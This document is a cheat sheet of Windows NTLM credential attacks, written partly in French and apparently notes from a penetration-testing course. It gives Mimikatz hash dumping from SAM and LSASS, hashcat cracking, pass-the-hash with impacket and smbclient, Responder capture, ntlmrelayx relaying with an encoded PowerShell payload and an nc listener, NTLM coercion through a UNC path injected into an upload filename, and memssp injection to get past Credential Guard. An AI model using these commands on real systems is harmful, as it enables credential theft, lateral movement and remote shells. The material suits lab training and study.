# NTLM

# Cracking NTLM

> We use "NTLM hash" to refer to the formally correct _NTHash_. Since "NTLM hash" is more commonly used in our industry, we use it in this course to avoid confusion.

```powershell
# Showing all local users in PowerShell
Get-LocalUser

# Mimikatz to dump hash
.\mimikatz.exe
privilege::debug
token::elevate
lsadump::sam

# Casser le hash hors lignes avec hashcat
hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best66.rule --force
```

# Passing NTLM

**Dump un hash**

```powershell
.\mimikatz.exe
privilege::debug
token::elevate
lsadump::sam
```

**S'authentifier avec le hash**

```bash
smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b

impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212

impacket-wmiexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
```

# Cracking Net-NTLMv2

> We use "Net-NTLMv2" to refer to the formally correct NTLMv2. Since "Net-NTLMv2" is more commonly used in our industry, we use it in this course to avoid confusion.

```bash
sudo responder -I tun0

echo -n 'paul::FILES01:1f9d4c51f6e74653:795F138EC69C274D0FD53BB32908A72B:010100000000000000B050CD1777D801B7585DF5719ACFBA0000000002000800360057004D00520001001E00570049004E002D00340044004E004800550058004300340054004900430004003400570049004E002D00340044004E00480055005800430034005400490043002E00360057004D0052002E004C004F00430041004C0003001400360057004D0052002E004C004F00430041004C0005001400360057004D0052002E004C004F00430041004C000700080000B050CD1777D801060004000200000008003000300000000000000000000000002000008BA7AF42BFD51D70090007951B57CB2F5546F7B599BC577CCD13187CFC5EF4790A001000000000000000000000000000000000000900240063006900660073002F003100390032002E003100360038002E003100310038002E0032000000000000000000 ' > hash.txt

hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --force
```

# Relaying Net-NTLMv2

```bash
impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c "powershell -enc JABjAGwAaQBlAG4AdA..."

nc -nvlp 8080
```

# Coerce manuel

**Via file upload**
```bash
------WebKitFormBoundarym8jBirVybIT6sjaf
Content-Disposition: form-data; name="myFile"; filename="\\\\192.168.45.242\\share\\test.txt"

Content-Type: text/plain

test
------WebKitFormBoundarym8jBirVybIT6sjaf--

# équivalent CURL
curl -X POST http://marketingwk01:8000/upload -F $'myFile=@test.txt;filename=\\\\\\\\192.168.45.242\\\\share\\\\test.txt'
```

**Via commande**
```powershell
dir \\192.168.45.242\share
```

# Credential Guard

> Quand Credential Guard est actif, les hashes de domaine sont stockés dans **LSAISO.exe** (VTL1), inaccessibles à Mimikatz. Contournement : injecter un SSP malveillant qui intercepte les credentials **en clair** au moment de la connexion.

## Credential Guard désactivé - dump LSASS

```powershell
.\mimikatz.exe
privilege::debug

# Dump la mémoire de lsass.exe où sont stockés les hashes des utilisateurs de domaine connectés sur la machine.
sekurlsa::logonpasswords
```

**Pass-the-Hash avec le hash de domaine récupéré**
```bash
impacket-wmiexec -hashes 00000000000000000000000000000000:<NTLM> CORP/Administrator@192.168.50.248
```

## Credential Guard activé - injection SSP
```powershell
.\mimikatz.exe
privilege::debug

# Injection SSP
misc::memssp

# Après reconnexion d'un utilisateur
type C:\Windows\System32\mimilsa.log
```
